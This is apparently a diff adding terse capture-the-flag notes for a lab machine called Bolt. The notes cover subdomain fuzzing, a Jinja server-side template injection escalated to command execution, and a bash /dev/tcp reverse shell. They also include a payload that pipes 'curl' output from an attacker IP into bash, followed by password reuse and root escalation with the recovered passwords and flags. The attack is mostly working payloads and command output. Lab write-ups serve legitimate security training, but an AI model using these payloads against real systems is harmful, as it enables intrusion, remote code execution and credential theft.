@@ -67,3 +67,96 @@ Host: passbolt.bolt.htb
 {"username":"admin@admin.htb"}
 
 [+]SSTI
+POST / HTTP/1.1
+name=admin&email=admin%40admin.htb&message=7*7}
+
+[+]HTTP/1.1 405 METHOD NOT ALLOWED
+[+]Allow: HEAD, GET, OPTIONS
+
+[+]Boiler Code Jinja[+]
+
+
+[+]wfuzz https
+
+   1   │ /login
+   2   │ /register
+   3   │ /resources
+   4   │ /users
+   5   │ /groups
+   6   │ /css
+   7   │ /app
+   8   │ /js
+   9   │ /logout
+  10   │ /fonts
+
+
+[+]wfuzz subdomains
+❯ wfuzz -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30341 -H "Host: FUZZ.bolt.htb" -u http://10.10.11.114
+000000002:   200        98 L     322 W      4943 Ch     "mail"                                                                                                                        
+000000038:   302        3 L      24 W       219 Ch      "demo" 
+
+[+]Credentials in /docker image
+admin
+deadbolt
+
+[+]SSTI
+http://demo.bolt.htb/admin/profile?
++ Settings
++ Name {{7*7}}
+
++ email http://mail.bolt.htb/?_task=mail&_mbox=INBOX
+49
+
+[+]SSTI to RCE
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+www-data 
+
+[+]SSTI to Revershell
+
++ Machine Box : vim shell.html
+File shell.html
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.42/4444 0>&1
+nc -lvnp 4444
+
++ Target
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://10.10.14.42/shell | bash').read() }}
+
+[+]Intrusion
+www-data@bolt:/var/tmp$ hostname -I
+10.10.11.114
+
+[+]linpeas.sh
+
+Analyzing Passbolt Files (limit 70)
+-rw-r----- 1 root www-data 3128 Feb 25  2021 /etc/passbolt/passbolt.php
+ * Passbolt ~ Open source password manager for teams
+            'host' => 'localhost',
+            'port' => '3306',
+            'username' => 'passbolt',
+            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
+            'database' => 'passboltdb',
+
+www-data@bolt:/home$ ls
+clark  eddie
+
+www-data@bolt:/home$ su clark
+Password: rT2;jW7<eY8!dX8}pQ8%
+su: Authentication failure
+
+www-data@bolt:/home$ su eddie
+Password: rT2;jW7<eY8!dX8}pQ8%
+
+eddie@bolt:~$ cat user.txt 
+9a985ac62fc9dc31612ad93c3e3036aa
+
+[+]Privilage escalation
+gpg decript messages
+
+password : "Z(2rmxsNW(Z?3=p/9s"
+
+eddie@bolt:~$ su root
+Password: Z(2rmxsNW(Z?3=p/9s
+
+root@bolt:/home/eddie# cat /root/root.txt 
+48cfbc5659b8201e9baf3334b077dfc4
